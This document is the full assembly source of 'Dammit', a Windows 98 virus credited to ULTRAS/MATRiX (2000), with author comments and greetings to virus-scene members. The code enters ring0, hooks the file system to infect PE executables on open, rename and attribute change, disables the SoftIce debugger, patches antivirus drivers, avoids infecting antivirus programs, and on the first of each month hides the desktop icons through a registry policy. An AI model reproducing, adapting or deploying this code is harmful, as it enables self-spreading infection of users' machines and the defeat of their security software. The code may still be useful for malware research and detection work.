   ; comment                                                                           ÿ
   ;
   ; [Dammit] by ULTRAS/MATRiX (c) 2000
   ;
   ; Virus Name   : Dammit
   ; Virus Author : ULTRAS/MATRiX
   ; Origin       : Russia
   ; Version      : 1.2
   ; Platform     : Win98
   ; Target       : PE files (EXE,SCR,CPL,OCX)
   ; Release      : 11 august 2000
   ; Features     :
   ;                ù Ring0-resident via int2E
   ;       ù Fuck SoftIce..
   ;       ù Kill AV VXD driver...
   ;       ù Avoid infection of certain files.
   ;       ù Infects on open, rename and in attribute change.
   ;       ù Small Payload...(kill all icon on desktop)
   ;                ù Anti-heuristics.
   ;
   ; Thanx       : Z0MBiE, MiXa.
   ;
   ; Greetz       : NBK, mort, anaktos, Del_Armg0, Lord Dark, Billy Belcebu, VirusBuster
   ;       CyberShadow, GreenMonster, Prizzy, Benny, Janush, T2000, SSR, JQwerty
   ;       CyberYoda, Zulu, Bhunji, HenKy, Murkry Asmodeus, Bumblebee,  n0
   ;       Vecna, MrSandman, SlageHammer, LordJulus, t00fic, DarkBeer, urg032,
   ;       mandragore, Shaitan, Spanska, Weird, mgl...
   ;       all peoplezZz i met on #virus & #vir & #smf
   ;
   ; ÿ

           .386p
           .model  flat
           .code

   Start:
           call    callring0       ; call ring0 via int2E
                           ; tnx Z0MBiE
           db  68h
   IBase       dd  $+4
           retn

   pusho           macro   r0el            ; ring0 macroz
                   local   _ringz
                   call    _ringz
                   jmp     r0el
   _ringz:         endm

           ; ring0-entering for win98
           ; (x) 2000 Z0MBiE

   callring0:      pushad
                   call   @@X
                   pushad
                   call   dword ptr [ecx]
                   popad
                   ret    8
   @@X:            sub    esp, 14h
                   xor    eax, eax
                   push   eax
                   lea    edx, [esp+24h]
                   push   edx
                   sub    esp, 54h
                   lea    edx, [esp-38h+1Ch+54h]
                   push   edx
                   push   edx
                   pusho  ring0            ; ring0 loader
                   mov    edx, esp
                   push   edx
                   push   edx
                   mov    edx, esp
                   mov    al, 8Ah              ; PoCallDriver
                   int    2Eh          ; int2E function
                   popad
                   add    esp, 88h-20h
                   popad
                   ret

   ; ring0 loader
   ; ~~~~~~~~~~~~

   ring0:      pushad              ; save all regs
           call    Delta2
   Delta2:     pop ebp
           sub ebp, offset Delta2

                   call    killavxd        ; Kill AV VXD

           mov eax, dr2
           cmp eax, '1EAD'     ; already resident
           jz  Shit

           push    MemSize         ; size to allocate
   VxDcall1:   int 20h
           dw  000Dh
           dw  0040h           ; allocate memory
           pop ecx         ; just to restore stack
           or  eax, eax        ; did we make it?
           jz  Shit            ; back to ring3

           mov [ebp+pm], byte ptr 0

           push    eax
           mov edi, eax        ; where move virus
           lea esi, [ebp+Start]    ; esi = start of virus
           mov ecx, VirusSize
           rep movsb           ; copy virus
           pop edi

           lea ecx, [edi+ApiHook-Start]    ; install new handler
           push    ecx
   VxDcall2:   int 20h             ; install my file system api hook
           dw  0067h
           dw  0040h               ; install api hook
           pop ecx             ; restore stack
           mov [edi+NextHook-Start], eax   ; save the old hook handler
           mov eax, "1EAD"         ; mark as resident
           mov dr2, eax

           call    CheckThePayloadDate     ;(and mayB do something:)
           call    fuckSoftIce

   Shit:       popad                   ; restore regs
           retn                    ; get out of ring0

   ; filesystem hook
   ; ~~~~~~~~~~~~~~~

   ApiHook:
           enter   20h, 00h        ; get parametrs off stack
           push    dword ptr [ebp+1Ch]
           push    dword ptr [ebp+18h]
           push    dword ptr [ebp+14h]
           push    dword ptr [ebp+10h]
           push    dword ptr [ebp+0Ch]
           push    dword ptr [ebp+08h]

           mov eax, [ebp+0Ch]
           cmp     eax, 21h        ; file attribute?
           je      Infect
           cmp eax, 24h        ; file open?
           je  Infect
           cmp eax, 25h        ; file rename?
           je  Infect
           jmp Bz


   Infect:     pushad              ; save all regs
           call    Delta3
   Delta3:     pop ebx
           sub ebx, offset Delta3

           cmp byte ptr [ebx+pm], 0
           jne pushnback
           inc byte ptr [ebx+pm]

           pushad              ; save all regs
           call    PathInf
           call    Infector
           popad               ; restore all regs

           dec byte ptr [ebx+pm]
   PushNBack:  popad               ; restore all regs


   Bz:     db  0B8h
   NextHook    dd  0
           call    [eax]           ; call old hook address
           add esp, 18h        ; restore stack
           leave
           ret

   pm      db  0


   ; check procedure
   ; ~~~~~~~~~~~~~~~

   PathInf:    pushad              ; save all regs
           lea edi, [ebx+FileName] ; get filepath's drive number
           mov eax, [ebp+10h]
           cmp al, 0FFh
           je  NoPath
           cmp al, 0
           je  NoPath
           add al, 'A'-1
           cld
           stosb
           mov al, ':'
           stosb

   NoPath:     push    0           ; prepare for unicode conversion
           push    100h            ; maximum filename
           mov eax, [ebp+1Ch]      ; get IOREQ
           mov eax, [eax+0Ch]
           add eax, 4
           push    eax
           push    edi
   VxDcall3:   int 20h         ; convert name
           dw  0041h
           dw  0040h
           add esp, 10h
           add edi, eax
           xor eax, eax
           stosb

           popad               ; restore all regs
           ret

   ; real pe infection
   ; ~~~~~~~~~~~~~~~~~

   Infector:   lea edi, [ebx+FileName]
   Ext:        cmp [edi], byte ptr 0
           je  TestZ
           inc edi
           jmp Ext

   TestZ:      cmp [edi-4], 'EXE.'     ; exe?
           jne bred

           ;cmp    [edi-4], 'XTM.'     ; MTX?
           ;jne    bred

               lea     edi,[ebx+FileName]
               pushad
               call    avoidfilez
               popad
               jc      Bred

           mov eax, 4300h      ; get attributes of the file
           lea esi, [ebx+FileName]
           call    R0_FileI0

           push    esi
           push    ecx
           mov eax, 4301h      ; clear attributes
           xor ecx, ecx
           call    R0_FileI0

           lea esi, [ebx+FileName]
           mov eax, 0D500h     ; R0_OPENCREATFILE
           mov ebx, 2
           xor ecx, ecx        ; file attribute
           mov edx, 1
           call    R0_FileI0
           jc  Atribut
           xchg    eax, ebx        ; eax = file handle

           call    Delta4
   Delta4:     pop ebp
           sub ebp, offset Delta4

           mov eax, 0D600h     ; R0_READFILE
           mov ecx, 4          ; bytes to read
           mov edx, 3Ch        ; position in file
           lea esi, [ebp+PEHead]   ; buffer to read to
           call    R0_FileI0

           mov eax, 0D600h
           mov edx, [ebp+PEHead]
           lea esi, [ebp+Header]
           mov ecx, 400h
           call    R0_FileI0

           cmp dword ptr [esi], 00004550h      ; make sure it is a PE
           jne Close
           cmp [esi+44h], '1EAD'       ; already infected?
           je  Close
           mov [esi+44h], '1EAD'       ; inf.marker
           mov edi, esi

           mov eax, [edi+34h]
           add eax, [edi+28h]
           mov [IBase+ebp], eax

           movzx   eax, word ptr [edi+06h]         ; get last section of header
           dec eax
           mov ecx, 40
           mul ecx
           add eax, 18h
           movzx   ecx, word ptr [edi+14h]
           add eax, ecx
           add esi, eax

           mov eax, 0D800h         ; get file size
           call    R0_FileI0

           mov ecx, [edi+3Ch]
           xor edx, edx
           div ecx             ; fuck i`m lazZzzy
           or  edx, edx
           jz  $+3
           inc eax
           mul ecx
           shl edx, 16
           add edx, eax

           push    esi
           push    edi

   ; fix vxdcall
   ; ~~~~~~~~~~~
           cld                      ; fixed vxdcallz
           lea esi, [ebp+VxDTable]
           mov ecx, VxDTabSize
   Loop$:      lodsd
           lea edi, [eax+ebp]
           mov ax, 20CDh
           stosw
           lodsd
           stosd
           loop    Loop$

           mov eax, 0D601h
           mov ecx, VirusSize
           lea esi, [ebp+Start]
   VxDcall4:   int 20h
           dw  0032h
           dw  0040h

           pop edi
           pop esi

           sub edx, [esi+14h]
           mov [esi+10h], edx

           add edx, [esi+0Ch]
           mov [edi+28h], edx

           mov eax, [esi+10h]
           cmp [esi+08h], eax
           jae Skip
           mov [esi+08h], eax

   Skip:       mov ecx, [edi+3Ch]
           mov eax, VirusSize
           xor edx, edx
           div ecx
           or  edx, edx
           jz  $+3
           inc eax
           mul ecx
           add [esi+10h], eax

           mov ecx, [edi+38h]
           mov eax, VirusSize
           xor edx, edx
           div ecx
           or  edx, edx
           jz  $+3
           inc eax
           mul ecx
           add [esi+08h], eax

           mov eax, [esi+08h]
           add eax, [esi+0Ch]
           mov [edi+50h], eax

           mov eax, 0D601h     ; write the modified header
           mov ecx, 400h       ; to the file
           mov edx, [ebp+PEHead]
           lea esi, [ebp+Header]
           call    R0_FileI0

   ; close filez & restore attributes
   ; ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

   close:      mov eax, 0D700h     ; close file
           call    R0_FileI0

   atribut:    pop ecx
           pop esi
           mov eax, 4301h      ; restore its attributes
           call    R0_FileI0

   Bred:       ret

   ; fuck softice
   ; ~~~~~~~~~~~~

   fuckSoftIce:    pushad

                   push    ebx
                   sidt    [esp-2]
                   pop     ebx

                   mov     eax, [ebx+01h*8+6-2]    ; int 01h
                   mov     ax, [ebx+01h*8+0]
                   call    fuckint

                   mov     eax, [ebx+03h*8+6-2]    ; int 03h
                   mov     ax, [ebx+03h*8+0]
                   call    fuckint

                   popad
                   ret

   fuckint:
           cmp     byte ptr [eax], 68h     ; softice signature
                   jne     __skipfuck
                   cmp     byte ptr [eax+5], 0E9h  ; -//-
                   jne     __skipfuck
                   mov     byte ptr [eax], 0CFh    ; iret
   __skipfuck:
           ret

   ; kill AV VXD
   ; ~~~~~~~~~~~

   killavxd:       pushad

                   ;VxDcall VXDLDR, GetDeviceList
   VxDcall5:
           int     20h
           dw  0005h
           dw  0027h

   __kavxd_scanvxd:
           mov     ebx, [eax+5]
                   cmp     ebx, 0C0000000h
                   jb      __kavxd_continue

                   lea     ecx, [ebx+0Ch]  ; Name_0

                   mov     edx, [ecx]
                   neg     edx

                   mov     cl, 1
                   cmp     edx, -'DIPS'        ; SPIDER
                   je      __kavxd_patch
                   mov     cl, 2
                   cmp     edx, -'9PVA'        ; AVP95
                   je      __kavxd_patch
                   mov     cl, 4
                   cmp     edx, -'GPVA'        ; AVPGUARD
                   je      __kavxd_patch
                   mov     cl, 8
                   cmp     edx, -'59KG'        ; GK95
                   je      __kavxd_patch

   __kavxd_continue:
           mov     eax, [eax]
                   or      eax, eax
                   jnz     __kavxd_scanvxd

                   popad
                   ret

   __kavxd_patch:
           pushad

                   pusho   kavxd_kill_moveax
                   pop     ebp

                   mov     esi, 0000D500h     ; R0_OPENCREATFILE
                   call    __kavxd_fuck
                   mov     esi, 0000D501h     ; R0_OPENCREAT_IN_CONTEXT
                   call    __kavxd_fuck

   ;  © ¤  ª á¯¥àáª¨©,  © ¤  fucking shit!
                   cmp     cl, 4   ;  avpguard
                   jne     __skip1

   ;               mov     eax, 1+1Bh          ; unload vxd
   ;               call    dword ptr [ebx+18h] ; control_proc_0

                   pusho   kavxd_kill_cd20
                   pop     ebp

                   mov     esi, 002A001Ah     ; VWIN32_SysErrorBox
                   call    __kavxd_fuck
                   mov     esi, 002A000Eh     ; VWIN32_SetWin32Event
                   call    __kavxd_fuck

                   pusho   kavxd_kill_badcall
                   pop     ebp

                   mov     eax, 002Ah ; VMM
                   xor     edi, edi

                   ;VMMcall Get_DDB
   VxDcall6:
           int     20h
           dw  0146h
           dw  0001h

                   mov     edx, [ecx+30h]  ; DDB_Service_Table_Ptr

                   ; LEA, but not MOV !
                   lea     esi, [edx+4*001Ah] ; VWIN32_SysErrorBox
                   call    __kavxd_fuck
                   lea     esi, [edx+4*000Eh] ; VWIN32_SetWin32Event
                   call    __kavxd_fuck

   __skip1:        popad
                   jmp     __kavxd_continue

   __kavxd_fuck:
           pushad

                   mov     edi, [ebx+18h]  ; Control_Proc_0

   __kavxd_1:      lea     ecx, [edi+4]    ; check presence for
                   test    ecx, 00000FFFh  ; each new page encountered
                   jnz     __kavxd_2

                   pushad

                   sub     esp, 28
                   mov     esi, esp

                   push    28
                   push    esi             ; esi = MEMORY_BASIC_INFO
                   push    ecx
   VxDcall7:
           int     20h
           dw  0134h
                   dw  0001h

                   test    dword ptr [esi+10h], 1000h ; mbi_state & MEM_COMMIT

                   lea     esp, [esp + 4*3 + 28]

                   popad
                   jnz     __kavxd_2

                   popad
                   ret

   __kavxd_2:      inc     edi
                   cmp     [edi], esi           ; <esi>
                   jne     __kavxd_1
                   call    ebp
                   jmp     __kavxd_1

   kavxd_kill_moveax:
           cmp     byte ptr [edi-1], 0B8h
                   jne     rt
                   mov     dword ptr [edi], -1  ; R0_xxx <-- 0xFFFFFFFF
                   ret

   kavxd_kill_cd20:
           cmp     word ptr [edi-2], 20CDh
                   jne     rt
   kavxd_kill_both:
           mov     word ptr [edi-2], 0B890h  ; nop/mov eax, 1
                   mov     dword ptr [edi], 1
                   ret

   kavxd_kill_badcall:
           cmp     word ptr [edi-2], 15FFh
                   je      kavxd_kill_both
   rt:             ret




   PointerTope dd  ?
   KeyOfPolicies   db  "Software\Microsoft\Windows\CurrentVersion\Policies\Explorer",0
   ValueName1  db  "NoDesktop",0       ; no desktop :) icon killer
   ValueToSet  dd  1


   ; small payload
   ; ~~~~~~~~~~~~~

   CheckThePayloadDate:

           mov al, 07h             ; get day
           out 70h, al
           in  al, 71h
           cmp al, 01h             ; Is it 1th?
           jne NoPayload

   PayLoad1:   lea eax, [PointerTope+ebp]      ; just a buffer
           push    eax
           lea eax, [KeyOfPolicies+ebp]    ; open this key
           push    eax
           push    80000001h
   VxDcall8:   int 20h
           dw  0148h
           dw  0001h
           add esp, 3*4            ; reset stackpointer

           push    4               ; length of value
           lea eax, [ValueToSet+ebp]       ; set value true
           push    eax
           push    4               ; type
           push    0               ; reserved
           lea eax, [ValueName1+ebp]
           push    eax
           push    [PointerTope+ebp]       ; handle
   VxDcall9:   int 20h
           dw  0152h
           dw  0001h
           add esp, 6*4

   NoPayload:  ret

   mark    db      "DAMMiT by ULTRAS [MATRiX]",0
           db      "(c) 2000",0


   ; avoid infection of certain files
   ; ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
   ;     tnx Billy Belcebu/iKX

   avoidfilez:
               lea     esi,[ebx+_notzinf]         ; load table
               mov     eax,"."                    ; search filename for a dot
               scasb
               jnz     $-1
               mov     eax,"\"                    ; now reverse the direction
               std                                ; and search for the last \
               scasb
               jnz     $-1
               inc     edi                        ; fix it
               inc     edi
               cld
   avoidf_loopz:
               xor     eax,eax
               lodsb
               cmp     al,0BBh            ; end of table?
               jz      procecedd              ; hmm...
               xchg    eax,ecx
               push    edi
               rep     cmpsb
               pop     edi
               jz      nevetoijizni               ;not found?
               add     esi,ecx
               jmp     avoidf_loopz               ;nxt plz
   procecedd:
               mov     cl,00h
               org     $-1
   nevetoijizni:
               stc
               ret

   ; to not infect these programmz
   ; ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

   _notzinf        label   byte
               db      03h,"AVP"      ; AVP?
           db  04h,"_AVP"     ; AVP?
           db  03h,"NAV"      ; Norton AV?
               db      02h,"TB"       ; ThunderByte?
               db      02h,"F-"       ; F-Prot?
               db      03h,"WEB"      ; DrWeb?
               db      03h,"PAV"      ; Panda?
           db      08h,"GUARDDOG" ; Guarddog?
               db      03h,"DRW"      ; Drweb?
           db      06h,"SPIDER"   ; Spider?
               db      04h,"DSAV"     ; Dr.solomon?
               db      03h,"NOD"      ; Nod-ice?
           db  03h,"MTX"      ; MaTriX
           db      06h,"MATRIX"   ; MATRiX? :))
               db      06h,"WINICE"   ; SoftICE?
               db      05h,"FDISK"    ; Fdisk?
               db      04h,"SCAN"     ; Scan?
               db      06h,"DEFRAG"   ; Defrag?
               db      0BBh

   R0_FileI0:
   VxDcall10:  int 20h
           dw  0032h
           dw  0040h
           ret

   ; vxdcall table
   ; ~~~~~~~~~~~~~

   VxDtable:   dd  offset VxDcall1
           dd  0040000Dh
           dd  offset VxDcall2
           dd  00400067h
           dd  offset VxDcall3
           dd  00400041h
           dd  offset VxDcall4
           dd  00400032h
           dd  offset VxDcall5
           dd  00270005h
           dd  offset VxDcall6
           dd  00010146h
           dd  offset VxDcall7
           dd  00010134h
           dd  offset VxDcall8
           dd  00010148h
           dd  offset VxDcall9
           dd  00010152h
           dd  offset VxDcall10
           dd  00400032h
   VxDTabSize  =   ($-VxDTable)/8


   VirusSize   =   $-Start

   PEHead      dd  0
   FileName    db  100h dup (0)
   Header      db  400h dup (0)

   MemSize     =   $-Start

           end Start
